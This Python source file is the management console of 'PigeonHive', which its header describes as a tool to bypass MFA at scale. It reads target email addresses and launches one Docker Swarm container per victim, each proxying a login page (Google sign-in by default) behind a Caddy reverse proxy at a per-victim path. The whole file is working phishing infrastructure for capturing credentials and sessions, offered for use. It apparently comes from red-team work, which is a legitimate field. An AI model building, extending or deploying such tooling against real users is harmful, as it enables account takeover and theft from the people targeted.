"""
PigeonHive - a tool to bypass MFA at scale.

Echelon Risk + Cyber

Authors - 
James Stahl
Steeven Rodriguez
Katterin Soto
"""


import docker
import argparse
import re
from pathlib import Path
from django.utils.crypto import get_random_string


# --- globals ---

# email regular expression; source: https://stackabuse.com/python-validate-email-address-with-regular-expressions-regex/
email_re = re.compile(r"([-!#-'*+/-9=?A-Z^-~]+(\.[-!#-'*+/-9=?A-Z^-~]+)*|\"([]!#-[^-~ \t]|(\\[\t -~]))+\")@([-!#-'*+/-9=?A-Z^-~]+(\.[-!#-'*+/-9=?A-Z^-~]+)*|\[[\t -Z^-~]*])")

# table to store email/id mappings
id_email_mapping = {}

# list to store IDs to prevent a (very unlikely) collision
magic_string = 'pigeonhive'
used_ids = [magic_string]

# used to interact with the docker engine
client = docker.from_env()

# name used for the overlay network
overlay_network_name = 'pigeonhive_overlay'

# main container information
pigeoncell_container_name = 'pigeoncell'
pigeoncell_container_path = Path('./pigeoncell_container')

# default url to be used for phishing
default_target = 'https://accounts.google.com/signin'
default_landing = 'localhost'

# ---------------

def main():

    # validate that the host is running a docker swarm
    try:
        swarm_client = client.swarm
        swarm_client.version
    except AttributeError:
        print('This host is not a swarm node; please run on a swarm manager node')
        exit(1)

    # initialize argument parser and create subparsers to hand subcommands
    parser = argparse.ArgumentParser(description='Management console for PigeonHive')
    parser.set_defaults(func=default_output)
    subparsers = parser.add_subparsers(title='subcommands', help='Select a general action to take')
    
    # create parser for "create" command
    create_parser = subparsers.add_parser('create', help='Create containers')
    create_parser.add_argument('email', nargs='+', action='extend', help='Email address(es) or file(s) containing a list of email address(es)')
    create_parser.add_argument('-t', '--target', help='target URL to be displayed by phishing page (default is Google\'s signin page', default=default_target)
    create_parser.add_argument('-l', '--landing', help='landing page URL on which PigeonHive is hosted (defaults to localhost)', default=default_landing)
    create_parser.set_defaults(func=create)

    # create parser for "query" command
    query_parser = subparsers.add_parser('query', help='Query active containers; currently only contains \'list\' but will contain more')
    query_parser.add_argument('choice', choices=['list'], help='Choose an action; \'list\' lists active containers')
    query_parser.set_defaults(func=query)

    # create parser for "delete" command
    delete_parser = subparsers.add_parser('delete', help='Delete active containers')
    delete_parser.add_argument('-e', '--email', nargs='+', action='extend', help='Email address(es) of containers to delete')
    delete_parser.add_argument('-i', '--id', nargs='+', action='extend', help='ID(s) to delete (ID refers to the 8 character ID generated and assigned to the \'name\' column, not the Docker-generated ID')
    delete_parser.add_argument('-a', '--all', action='store_true', help='Delete all containers')
    delete_parser.set_defaults(func=delete)

    args = parser.parse_args()
    args.func(args)


def create(args):
    input_list = args.email
    email_list = []
    target = args.target
    landing = args.landing

    # check if overlay network exists and create it if not
    networks = client.networks
    if not networks.list(names=[overlay_network_name]):
        print('No overlay network detected, creating now...')
        networks.create(
            name=overlay_network_name,
            driver='overlay',
            internal=True,
            scope='swarm'
        )
        print(f'Created overlay network \'{overlay_network_name}\'')

    # check if item is an email address; if not, check if it is a file and add emails from file
    for item in input_list:

        # add email to list if valid
        if is_valid_email(item):
            email_list.append(item)

        # for each line in file, check if line is a valid email and add if so
        elif Path(item).is_file():
            with Path(item).open('r') as input_file:
                for line in input_file:
                    candidate = line.strip()
                    email_list.append(candidate) if is_valid_email(candidate) else print(f'{candidate} from file {item} does not appear to be an email address')

        else:
            print(f'{item} does not appear to be an email address or a file')

    # generate IDs (to be handled by GoPhish in the future)
    for email in email_list:

        # add dict record with id as key, email as value
        id_email_mapping.update({generate_id(): email})
    
    # TODO: check if management node is active
    services = client.services
    pass

    # build image - reference: https://docker-py.readthedocs.io/en/stable/images.html
    print(f'Building pigeonhole image with tag \'{pigeoncell_container_name}\'...')
    image, output = client.images.build(path=pigeoncell_container_path.as_posix(), tag=pigeoncell_container_name)

    # create service for each id/email
    for id in id_email_mapping:
        
        print(f'Creating service for {id}: {id_email_mapping[id]}')

        # create pigeoncell service for the id/email 
        services.create(
            image=pigeoncell_container_name,
            name=id,
            networks=[overlay_network_name],
            env=[f'URL={target}'],
            mounts=['/dev/shm:/dev/shm:rw'],
            labels={
                'email': id_email_mapping[id],  # make a label to identify services by email
                'caddy': landing,               # this and the following labels define caddy behavior for the reverse proxy
                'caddy.handle_path': f'/{id}',
                'caddy.handle_path.reverse_proxy': '{{upstreams 5800}}'
            }
        )


def query(args):
    if args.choice == 'list':
        services = client.services
        running = services.list()

        # iterate through services and output id and email
        for service in running:
            email = service.attrs['Spec']['Labels']['email']
            print(f'{service.name}: {email}')


def delete(args):
    services = client.services
    running = services.list()
    deletion_list = []

    if args.all:
        deletion_list.extend(services.list())
    if args.id is not None:
        deletion_list.extend(services.list(filters={'name': args.id}))
    if args.email is not None:
        deletion_list.extend(services.list(filters={'label': {'email': args.email}}))
    
    print(deletion_list)

    if deletion_list:
        [service.remove() for service in deletion_list]
        

def is_valid_email(email):

    # returns true if email is valid (via regex)
    return re.fullmatch(email_re, email)


def generate_id():

    # generate IDs until a unique one is found (likely on first try)
    candidate = magic_string
    while candidate in used_ids:
        candidate = get_random_string(8)

    return candidate


def default_output(null):

    # source: https://ascii.co.uk/art/pigeon
    ascii_art = """
                            -
    \\                  /   @ )
      \\             _/_   |~ \\)   coo
        \\     ( ( (     \ \\          
         ( ( ( ( (       | \\
_ _=(_(_(_(_(_(_(_  _ _ /  )
                -  _ _ _  /
                      _\\___
                     `    "'
    """

    print(ascii_art)
    print('Pass -h or --help for usage')


if __name__ == '__main__':
    main()
